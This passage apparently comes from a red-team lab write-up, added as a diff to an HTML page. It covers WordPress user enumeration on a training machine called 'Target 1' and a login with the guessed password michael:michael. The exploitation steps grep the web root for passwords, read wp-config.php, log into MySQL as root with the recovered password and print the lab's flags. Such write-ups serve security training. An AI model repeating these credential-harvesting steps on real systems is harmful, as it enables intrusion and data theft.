+<span id="cb4-62"><a href="#cb4-62" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confirmed</span> By: Login Error Messages (Aggressive Detection)</span>
+<span id="cb4-63"><a href="#cb4-63" aria-hidden="true"></a></span>
+<span id="cb4-64"><a href="#cb4-64" aria-hidden="true"></a>[<span class="ex">+</span>] michael</span>
+<span id="cb4-65"><a href="#cb4-65" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span>
+<span id="cb4-66"><a href="#cb4-66" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confirmed</span> By: Login Error Messages (Aggressive Detection)</span>
+<span id="cb4-67"><a href="#cb4-67" aria-hidden="true"></a></span>
+<span id="cb4-68"><a href="#cb4-68" aria-hidden="true"></a>[!] <span class="ex">No</span> WPVulnDB API Token given, as a result vulnerability data has not been output.</span>
+<span id="cb4-69"><a href="#cb4-69" aria-hidden="true"></a>[!] <span class="ex">You</span> can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span>
+<span id="cb4-70"><a href="#cb4-70" aria-hidden="true"></a></span>
+<span id="cb4-71"><a href="#cb4-71" aria-hidden="true"></a>[<span class="ex">+</span>] Finished: Sat Mar 19 16:11:22 2022</span>
+<span id="cb4-72"><a href="#cb4-72" aria-hidden="true"></a>[<span class="ex">+</span>] Requests Done: 48</span>
+<span id="cb4-73"><a href="#cb4-73" aria-hidden="true"></a>[<span class="ex">+</span>] Cached Requests: 4</span>
+<span id="cb4-74"><a href="#cb4-74" aria-hidden="true"></a>[<span class="ex">+</span>] Data Sent: 10.471 KB</span>
+<span id="cb4-75"><a href="#cb4-75" aria-hidden="true"></a>[<span class="ex">+</span>] Data Received: 284.802 KB</span>
+<span id="cb4-76"><a href="#cb4-76" aria-hidden="true"></a>[<span class="ex">+</span>] Memory used: 120.961 MB</span>
+<span id="cb4-77"><a href="#cb4-77" aria-hidden="true"></a>[<span class="ex">+</span>] Elapsed time: 00:00:02</span></code></pre></div>
+<h3 id="exploitation">Exploitation</h3>
+<p>The Red Team was able to penetrate <code>Target 1</code> and retrieve the following confidential data: - Target 1</p>
+<p><strong>Exploit Used</strong> - Wordpress user enumeration vulnerability - ```bash [i] User(s) Identified:</p>
+<pre><code>  [+] steven
+  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+  | Confirmed By: Login Error Messages (Aggressive Detection)
+
+  [+] michael
+  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+  | Confirmed By: Login Error Messages (Aggressive Detection)
+  ```</code></pre>
+<ul>
+<li>Poor password hygiene
+<ul>
+<li>Password same as user name - michael:michael</li>
+</ul></li>
+<li><code>flag1.txt: {b9bbcb33e11b80be759c4e844862482d}</code></li>
+</ul>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="ex">michael@target1</span>:~$ grep -r <span class="st">&quot;flag1&quot;</span> / <span class="op">2&gt;</span>/dev/null</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="ex">Binary</span> file /proc/1804/task/1804/cmdline matches</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="ex">Binary</span> file /proc/1804/cmdline matches</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="ex">/var/www/html</span>/service.html:<span class="op">&lt;</span>!<span class="ex">--</span> flag1<span class="dt">{b9bbcb33e11b80be759c4e844862482d}</span> --<span class="op">&gt;</span></span></code></pre></div>
+<ul>
+<li><code>flag2.txt: {fc3fd58dcdad9ab23faca6e9a36e581c}</code></li>
+</ul>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="ex">michael@target1</span>:~$ find / -iname *flag* <span class="op">2&gt;</span>/dev/null</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="ex">/proc/kpageflags</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a><span class="ex">/proc/sys/kernel/acpi_video_flags</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a><span class="ex">/var/www/html/wordpress/wp-includes/images/icon-pointer-flag-2x.png</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a><span class="ex">/var/www/html/wordpress/wp-includes/images/icon-pointer-flag.png</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a><span class="ex">/var/www/flag2.txt</span></span></code></pre></div>
+<ul>
+<li><code>flag3.txt: {afc01ab56b50591e7dccf93122770cd2}</code></li>
+<li><code>flag4.txt: {715dea6c055b9fe3337544932f2941ce}</code></li>
+</ul>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="ex">michael@target1</span>:~$ grep -r <span class="st">&quot;PASSWORD&quot;</span> /var/www/html/ <span class="op">2&gt;</span>/dev/null</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a><span class="ex">.</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a><span class="ex">.</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true"></a><span class="ex">.</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true"></a><span class="ex">/var/www/html/wordpress/wp-admin</span>/setup-config.php:      <span class="ex">define</span>(<span class="st">&#39;DB_PASSWORD&#39;</span>, <span class="va">$pwd</span>);</span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true"></a><span class="ex">/var/www/html/wordpress/wp-admin</span>/setup-config.php:                      <span class="kw">case</span> <span class="st">&#39;DB_PASSWORD&#39;</span> :</span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true"></a>/var/www/html/wordpress/wp-config.php:define(<span class="st">&#39;DB_PASSWORD&#39;</span>, <span class="st">&#39;R@v3nSecurity&#39;</span>);</span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true"></a>/var/www/html/wordpress/wp-config-sample.php:define(<span class="st">&#39;DB_PASSWORD&#39;</span>, <span class="st">&#39;password_here&#39;</span>);</span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="fu">cat</span> /var/www/html/wordpress/wp-config.php</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a><span class="ex">/**</span> MySQL database username */</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a><span class="ex">define</span>(<span class="st">&#39;DB_USER&#39;</span>, <span class="st">&#39;root&#39;</span>);</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a><span class="ex">/**</span> MySQL database password */</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true"></a><span class="ex">define</span>(<span class="st">&#39;DB_PASSWORD&#39;</span>, <span class="st">&#39;R@v3nSecurity&#39;</span>);</span></code></pre></div>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="ex">mysql</span> -u root -pR@v3nSecurity</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a><span class="ex">mysql</span><span class="op">&gt;</span> show databases<span class="kw">;</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a><span class="ex">+--------------------+</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">Database</span>           <span class="kw">|</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a><span class="ex">+--------------------+</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">information_schema</span> <span class="kw">|</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">mysql</span>              <span class="kw">|</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">performance_schema</span> <span class="kw">|</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wordpress</span>          <span class="kw">|</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true"></a><span class="ex">+--------------------+</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true"></a></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true"></a><span class="ex">mysql</span><span class="op">&gt;</span> use wordpress<span class="kw">;</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true"></a><span class="ex">mysql</span><span class="op">&gt;</span> show tables<span class="kw">;</span></span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true"></a></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true"></a><span class="ex">+-----------------------+</span></span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">Tables_in_wordpress</span>   <span class="kw">|</span></span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true"></a><span class="ex">+-----------------------+</span></span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_commentmeta</span>        <span class="kw">|</span></span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_comments</span>           <span class="kw">|</span></span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_links</span>              <span class="kw">|</span></span>
+<span id="cb10-22"><a href="#cb10-22" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_options</span>            <span class="kw">|</span></span>
+<span id="cb10-23"><a href="#cb10-23" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_postmeta</span>           <span class="kw">|</span></span>
+<span id="cb10-24"><a href="#cb10-24" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_posts</span>              <span class="kw">|</span></span>
+<span id="cb10-25"><a href="#cb10-25" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_term_relationships</span> <span class="kw">|</span></span>
+<span id="cb10-26"><a href="#cb10-26" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_term_taxonomy</span>      <span class="kw">|</span></span>
+<span id="cb10-27"><a href="#cb10-27" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_termmeta</span>           <span class="kw">|</span></span>
+<span id="cb10-28"><a href="#cb10-28" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_terms</span>              <span class="kw">|</span></span>
+<span id="cb10-29"><a href="#cb10-29" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_usermeta</span>           <span class="kw">|</span></span>
+<span id="cb10-30"><a href="#cb10-30" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">wp_users</span>              <span class="kw">|</span></span>
+<span id="cb10-31"><a href="#cb10-31" aria-hidden="true"></a><span class="ex">+-----------------------+</span></span>
+<span id="cb10-32"><a href="#cb10-32" aria-hidden="true"></a></span>
+<span id="cb10-33"><a href="#cb10-33" aria-hidden="true"></a><span class="ex">mysql</span><span class="op">&gt;</span> select * from wp_posts<span class="kw">;</span></span></code></pre></div>
+<figure>
+<img src="images/flag3and4.png" alt="" /><figcaption>Flag 3 and 4</figcaption>
+</figure>
